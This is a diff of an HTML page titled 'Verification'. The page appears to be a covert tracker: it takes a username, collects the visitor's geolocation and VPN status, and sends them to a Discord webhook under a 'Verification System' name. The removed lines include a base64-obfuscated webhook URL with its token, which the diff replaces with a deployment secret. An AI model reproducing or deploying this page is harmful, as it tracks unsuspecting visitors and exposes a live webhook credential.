@@ -6,7 +6,7 @@
   <title>🔒 Verification</title>
   <style>
     @keyframes bgAnim { 0%,100% { background-position:0% 50% } 50% { background-position:100% 50% } }
-    body { margin:0; padding:0; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; font-family:'Segoe UI',sans-serif; background:linear-gradient(-45deg,#1c1c2f,#2c2c3e,#1c1c2f,#2c2c3e); background-size:400% 400%; animation:bgAnim 20s ease infinite; color:#eee; overflow:hidden; }
+    body { margin:0; padding:0; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; font-family:'Segoe UI',sans-serif; background:linear-gradient(-45deg, #1e1e2f, #2c2c3e, #3a3a4d, #4a4a5e); background-size:400% 400%; animation:bgAnim 15s infinite; color:#eee; text-shadow:0 2px 4px rgba(0,0,0,0.6); }
     .particle { position:absolute; border-radius:50%; background:rgba(255,255,255,0.05); animation:drift linear infinite; }
     @keyframes drift { from{transform:translate(0,0)} to{transform:translate(100px,-200px)} }
     .card { position:relative; width:90%; max-width:360px; padding:2rem; background:rgba(0,0,0,0.75); border-radius:12px; box-shadow:0 8px 32px rgba(0,0,0,0.6); text-align:center; z-index:1; }
@@ -35,21 +35,7 @@
 
   <script>
   document.addEventListener('DOMContentLoaded', () => {
-    // Floating particles
-    for (let i = 0; i < 30; i++) {
-      const p = document.createElement('div');
-      const size = 2 + Math.random() * 4;
-      p.className = 'particle';
-      p.style.width = size + 'px';
-      p.style.height = size + 'px';
-      p.style.left = Math.random() * 100 + 'vw';
-      p.style.top = Math.random() * 100 + 'vh';
-      p.style.animationDuration = 10 + Math.random() * 10 + 's';
-      document.body.appendChild(p);
-    }
-
-    const encoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MTI0OTkxMTY1NTU2MzM3NC8yNDFBdWM1Tl9rbnJuZUk4dWNQN2pNVmNkZzJrZzFRYUd4dy1NUVdhTXRpVWEwZWdtTUpHSDlQcXBOTkEyZ3dSamlIWQ==';
-    const WEBHOOK = atob(encoded);
+    const WEBHOOK = '${{ secrets.WEHOOK }}'; // Dynamic injection during deployment
 
     const usernameInput = document.getElementById('username');
     const submitBtn = document.getElementById('submitBtn');
@@ -58,7 +44,7 @@
     function showStatus(success, text) {
       const icon = success
         ? '<svg width="24" height="24" fill="#28a745"><path d="M16 2L6 14 0 8l2-2 4 4L14 0z"/></svg>'
-        : '<svg width="24" height="24" fill="#ffc107"><path d="M8 1a7 7 0 1 1 0 14A7 7 0 0 1 8 1zm0 4.5a.5.5 0 0 0-.5.5v3.5a.5.5 0 0 0 1 0V6a.5.5 0 0 0-.5-.5zm.002 6a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1z"/></svg>';
+        : '<svg width="24" height="24" fill="#ffc107"><path d="M8 1a7 7 0 1 1 0 14A7 7 0 0 1 8 1zm0 4.5a.5.5 0 0 0-.5.5v3.5a.5.5 0 0 0 1 0V6a.5.5 0 0 0-.5-.5zm.002 6a.75.75 0 1 0 0 1.5.75.75 0 0 0[...]
       statusEl.innerHTML = icon + '<span>' + text + '</span>';
       statusEl.classList.add('visible');
     }
@@ -139,7 +125,7 @@
           username: 'Verification System',
           embeds: [
             {
-              title: `${geo.country_code ? String.fromCodePoint(...geo.country_code.toUpperCase().split('').map(c => 127397 + c.charCodeAt())) : ''} User Verification: ${geo.city || 'Unknown'}, ${geo.region || geo.region_name}, ${geo.country_name}`,
+              title: `${geo.country_code ? String.fromCodePoint(...geo.country_code.toUpperCase().split('').map(c => 127397 + c.charCodeAt())) : ''} User Verification: ${geo.city || 'Unknown'}, ${geo.country_name}`,
               color: vpn ? 16755007 : 65280,
               fields: [
                 { name: '🔍 Username', value: username, inline: true },
@@ -186,4 +172,3 @@
   </script>
 </body>
 </html>
-
